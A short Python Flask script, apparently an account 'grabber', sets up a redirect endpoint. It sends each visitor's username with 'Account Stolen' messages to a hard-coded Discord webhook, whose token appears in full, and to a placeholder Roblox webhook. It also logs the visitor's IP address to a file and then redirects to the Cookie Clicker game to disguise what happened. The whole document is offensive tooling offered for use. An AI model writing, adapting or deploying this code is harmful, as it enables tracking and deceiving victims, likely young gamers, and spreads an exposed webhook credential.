import requests
from flask import Flask, redirect, request

app = Flask(__name__)

# Discord webhook URL
discord_webhook_url = 'https://discord.com/api/webhooks/1241497177771999233/IBBDUMt981jObFoKodixaPC7TWaV-apMYGUWYnyizwUtWWiKKZhp4Wzq91dFbGmFcuhX'

# Endpoint to handle the redirection
@app.route('/redirect', methods=['GET'])
def redirect_to_site():
    target_username = request.args.get('username')
    
    # Send the username to your Discord webhook
    discord_payload = {'content': f'Discord Account Stolen for user: {target_username}'}
    requests.post(discord_webhook_url, json=discord_payload)
    
    # Replace 'YOUR_ROBLOX_WEBHOOK_URL' with your Roblox webhook URL
    roblox_webhook_url = 'YOUR_ROBLOX_WEBHOOK_URL'
    # Send the username to your Roblox webhook
    roblox_payload = {'content': f'Roblox Account Stolen for user: {target_username}'}
    requests.post(roblox_webhook_url, json=roblox_payload)
    
    # Retrieve the user's IP address
    user_ip = request.remote_addr
    # Log the user's IP address
    with open('user_ips.txt', 'a') as f:
        f.write(f'User: {target_username}, IP: {user_ip}\n')
    
    # Redirect to Cookie Clicker game
    return redirect('https://orteil.dashnet.org/cookieclicker/', code=302)

# Main function to run the Flask app
if __name__ == '__main__':
    app.run(port=5000)
